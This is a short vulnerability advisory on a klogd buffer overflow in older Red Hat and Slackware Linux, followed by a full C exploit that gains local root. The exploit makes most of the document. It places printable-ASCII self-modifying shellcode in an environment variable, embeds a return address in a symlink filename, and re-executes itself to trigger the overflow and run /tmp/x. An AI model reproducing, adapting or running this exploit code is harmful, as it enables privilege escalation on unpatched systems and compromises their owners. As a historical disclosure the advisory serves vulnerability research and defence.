source: http://www.securityfocus.com/bid/398/info
 
 
It is possible to cause a denial of service (remote and local) through generating old, obscure kernel messages (not terminated with \n) in klogd. The problem exists because of a buffer overflow in the klogd handling of kernel messages. It is possible to gain local root access through stuffing shellcode into printk() messages which contain user-controllable variables (eg, filenames). What makes this problem strange, however, is that it was fixed two years ago. Two of the most mainstream linux distributions (Slackware Linux and RedHat Linux), up until recently, are known to have been shipping with the very old vulnerable version. Fixes and updates were released promptly. There is no data on other distributions.

/*
 * Linux/x86 klogd exploit using envcheck by
 * Esa Etelavuori (www.iki.fi/ee/) in 2k0912
 * Tested on Red Hat 6.2 / Celeron A & P2.
 * You need some skillz to use this.
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define RETADDR    0xbffffdab

int main(int ac, char **av)
{
    char sting[] = "./[<%2009xAAAABBB";
    /* Self-modifying code using 0x20 - 0x7e chars and execing /tmp/x.
     * May need tuning for correct %esp offset (%ebx) for modification
     * of last two bytes which are transformed into int 0x80. */
    char *venom = "LC_ALL="
        "T[fhBOfXf5B@f1ChjAX4APPZHf1Chfh/xh/tmpT[RSTYjOX4D2p";

    if (ac != 1 && ac != 2) {
        fprintf(stderr, "usage: %s [return address]\n", av[0]);
        exit(1);
    }

    if (ac == 2 && av[1][0] == '-') {
        printf("done\n");
        exit(0); 
    }
    else if (ac == 2 && av[1][0] == '+') {
        if (putenv(venom)) {
            perror("putenv");
            exit(1);
        }
        execl(av[0], av[0], "-", NULL);
    }
    else {
        *(unsigned long *)(&sting[strlen(sting) - 4 - 3])
            = ac == 1 ? RETADDR: strtoul(av[1], NULL, 0);
        if (symlink(av[0], sting)) {
            perror("symlink");
            exit(1);
        }
        execl(sting, sting, "+", NULL);
    }

    perror("execl");
    exit(1);
}